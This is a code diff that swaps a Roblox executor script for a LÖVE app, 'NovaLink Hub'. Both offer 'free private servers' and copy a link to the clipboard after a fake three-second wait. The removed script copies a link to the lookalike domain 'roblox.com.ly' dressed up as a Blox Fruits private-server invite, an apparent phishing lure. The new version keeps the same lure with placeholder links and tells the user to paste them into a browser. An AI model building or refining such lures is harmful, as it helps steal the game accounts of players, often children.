@@ -1,46 +1,96 @@
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
+local buttons = {
+    {
+        x = 90,
+        y = 180,
+        w = 220,
+        h = 55,
+        link = "https://link1.com",
+        state = "idle",
+        timer = 0
+    },
+    {
+        x = 90,
+        y = 260,
+        w = 220,
+        h = 55,
+        link = "https://link2.com",
+        state = "idle",
+        timer = 0
+    }
+}
 
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "FSC_Loader"
-ScreenGui.Parent = game.CoreGui
+function love.load()
+    love.window.setMode(400, 400)
+    love.window.setTitle("NovaLink Hub")
+end
 
-local Frame = Instance.new("Frame")
-Frame.Size = UDim2.new(0, 320, 0, 180)
-Frame.Position = UDim2.new(0.5, -160, 0.5, -90)
-Frame.BackgroundColor3 = Color3.fromRGB(25,25,25)
-Frame.Parent = ScreenGui
-Frame.Active = true
-Frame.Draggable = true
+function love.update(dt)
+    for _, btn in ipairs(buttons) do
+        if btn.state == "waiting" then
+            btn.timer = btn.timer + dt
+            if btn.timer >= 3 then
+                love.system.setClipboardText(btn.link)
+                btn.state = "copied"
+            end
+        end
+    end
+end
 
-local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1,0,0.4,0)
-Title.BackgroundTransparency = 1
-Title.Text = "Free servidores privados\nCreado por Free Servers Community"
-Title.TextColor3 = Color3.new(1,1,1)
-Title.TextScaled = true
-Title.Parent = Frame
+function love.draw()
+    love.graphics.setBackgroundColor(0.07, 0.07, 0.1)
 
-local Button = Instance.new("TextButton")
-Button.Size = UDim2.new(0.8,0,0.3,0)
-Button.Position = UDim2.new(0.1,0,0.6,0)
-Button.BackgroundColor3 = Color3.fromRGB(0,170,255)
-Button.TextColor3 = Color3.new(1,1,1)
-Button.TextScaled = true
-Button.Text = "Get Link"
-Button.Parent = Frame
+    -- Título
+    love.graphics.setColor(0, 0.8, 1)
+    love.graphics.printf("NovaLink Hub", 0, 60, 400, "center")
 
-local link = "https://roblox.com.ly/games/2753915549/Event-Blox-Fruits?privateServerLinkCode=36614867226193845417684496298532"
+    love.graphics.setColor(1,1,1)
+    love.graphics.printf("Free servidores privados", 0, 90, 400, "center")
 
-Button.MouseButton1Click:Connect(function()
-	Button.Text = "Copiando..."
-	
-	task.wait(3)
-	
-	if setclipboard then
-		setclipboard(link)
-		Button.Text = "¡Copiado!"
-	else
-		Button.Text = "No soportado"
-	end
-end)
+    love.graphics.setColor(0.6,0.6,0.6)
+    love.graphics.printf("Created by Orion Devs", 0, 115, 400, "center")
+
+    for i, btn in ipairs(buttons) do
+        love.graphics.setColor(0, 0.6, 1)
+        love.graphics.rectangle("fill", btn.x, btn.y, btn.w, btn.h, 14, 14)
+
+        love.graphics.setColor(1,1,1)
+
+        local text = "Get Link "..i
+
+        if btn.state == "waiting" then
+            text = "Copiando..."
+        elseif btn.state == "copied" then
+            text = "Copiado. Pega en el navegador"
+        end
+
+        love.graphics.printf(text, btn.x, btn.y + 18, btn.w, "center")
+    end
+end
+
+-- PC Click
+function love.mousepressed(x, y, button)
+    if button == 1 then
+        checkClick(x, y)
+    end
+end
+
+-- Celular Touch
+function love.touchpressed(id, x, y)
+    x = x * 400
+    y = y * 400
+    checkClick(x, y)
+end
+
+function checkClick(x, y)
+    for _, btn in ipairs(buttons) do
+        if x > btn.x and x < btn.x + btn.w and
+           y > btn.y and y < btn.y + btn.h then
+
+            if btn.state == "idle" then
+                btn.state = "waiting"
+                btn.timer = 0
+            end
+        end
+    end
+end
+
